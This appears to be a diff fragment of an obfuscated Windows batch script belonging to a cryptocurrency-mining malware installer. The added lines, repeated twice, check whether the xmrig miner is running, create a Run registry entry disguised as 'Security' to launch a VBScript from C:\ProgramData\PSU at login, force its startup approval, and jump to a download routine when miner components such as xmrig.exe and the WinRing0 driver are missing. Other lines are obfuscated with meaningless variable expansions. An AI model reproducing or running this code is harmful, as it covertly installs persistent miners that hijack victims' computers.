 %aaaaa%%aaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbbbbbbbbbb% /%bbbbbbbbbbbbbbbbbbbb% /%bbbbbbb% "%bbbb%:\%bbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa% %bbbbbbb%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa% (%aaaaaaaaaaaaaaaaaaaaaaaaa%86)\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\*.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%" > %aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%
 %aaaaa%%aaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbbbbbbbbbb% /%bbbbbbbbbbbbbbbbbbbb% /%bbbbbbb% "%bbbb%:\%bbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa% %bbbbbbb%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa% (%aaaaaaaaaaaaaaaaaaaaaaaaa%86)\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\*.%aaaaa%%aaaaaa%%aaaaaaa%" > %aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+if not exist "C:\ProgramData\PSU\bgin.bat" goto download
+if not exist "C:\ProgramData\PSU\check.bat" goto download
+if not exist "C:\ProgramData\PSU\config.json" goto download
+if not exist "C:\ProgramData\PSU\execute.vbs" goto download
+if not exist "C:\ProgramData\PSU\Install.vbs" goto download
+if not exist "C:\ProgramData\PSU\process.bat" goto download
+if not exist "C:\ProgramData\PSU\run.doc" goto download
+if not exist "C:\ProgramData\PSU\run.xls" goto download
+if not exist "C:\ProgramData\PSU\samba.vbs" goto download
+if not exist "C:\ProgramData\PSU\smb.bat" goto download
+if not exist "C:\ProgramData\PSU\start.vbs" goto download
+if not exist "C:\ProgramData\PSU\Start-Monero.bat" goto download
+if not exist "C:\ProgramData\PSU\WinRing0x64.sys" goto download
+if not exist "C:\ProgramData\PSU\xmrig.exe" goto download
 %aaaaa%%aaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbbbbbbbbbb% /%bbbbbbbbbbbbbbbbbbbb% /%bbbbbbb% "%bbbb%:\%bbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa% %bbbbbbb%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa% (%aaaaaaaaaaaaaaaaaaaaaaaaa%86)\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\*.%aaaaaaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaa%" > %aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%
 %aaaaa%%aaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbbbbbbbbbb% /%bbbbbbbbbbbbbbbbbbbb% /%bbbbbbb% "%bbbb%:\%bbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa% %bbbbbbb%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa% (%aaaaaaaaaaaaaaaaaaaaaaaaa%86)\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\*.%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%" > %aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%
 %aaaaa%%aaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbbbbbbbbbb% /%bbbbbbbbbbbbbbbbbbbb% /%bbbbbbb% "%bbbb%:\%bbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa% %bbbbbbb%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa% (%aaaaaaaaaaaaaaaaaaaaaaaaa%86)\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\*.%aaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaa%" > %aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%
@@ -1970,6 +2077,25 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 %aaaaa%%aaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbbbbbbbbbb% /%bbbbbbbbbbbbbbbbbbbb% /%bbbbbbb% "%bbbb%:\%bbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa% %bbbbbbb%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\*.%aaaaa%%aaaaaa%%aaaaaaa%" > %aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%
 %aaaaa%%aaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbbbbbbbbbb% /%bbbbbbbbbbbbbbbbbbbb% /%bbbbbbb% "%bbbb%:\%bbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa% %bbbbbbb%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\*.%aaaaaaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaa%" > %aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%
 %aaaaa%%aaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbbbbbbbbbb% /%bbbbbbbbbbbbbbbbbbbb% /%bbbbbbb% "%bbbb%:\%bbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa% %bbbbbbb%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\*.%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%" > %aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+if not exist "C:\ProgramData\PSU\bgin.bat" goto download
+if not exist "C:\ProgramData\PSU\check.bat" goto download
+if not exist "C:\ProgramData\PSU\config.json" goto download
+if not exist "C:\ProgramData\PSU\execute.vbs" goto download
+if not exist "C:\ProgramData\PSU\Install.vbs" goto download
+if not exist "C:\ProgramData\PSU\process.bat" goto download
+if not exist "C:\ProgramData\PSU\run.doc" goto download
+if not exist "C:\ProgramData\PSU\run.xls" goto download
+if not exist "C:\ProgramData\PSU\samba.vbs" goto download
+if not exist "C:\ProgramData\PSU\smb.bat" goto download
+if not exist "C:\ProgramData\PSU\start.vbs" goto download
+if not exist "C:\ProgramData\PSU\Start-Monero.bat" goto download
+if not exist "C:\ProgramData\PSU\WinRing0x64.sys" goto download
+if not exist "C:\ProgramData\PSU\xmrig.exe" goto download
 %aaaaa%%aaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbbbbbbbbbb% /%bbbbbbbbbbbbbbbbbbbb% /%bbbbbbb% "%bbbb%:\%bbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa% %bbbbbbb%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\*.%aaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaa%" > %aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%
 %aaaaa%%aaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbbbbbbbbbb% /%bbbbbbbbbbbbbbbbbbbb% /%bbbbbbb% "%bbbb%:\%bbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa% %bbbbbbb%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\*.%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%" > %aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%
 %aaaaa%%aaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbbbbbbbbbb% /%bbbbbbbbbbbbbbbbbbbb% /%bbbbbbb% "%bbbb%:\%bbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaa% %bbbbbbb%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaa%\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\%bbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaa%~1\*.%aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaa%" > %aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaa%
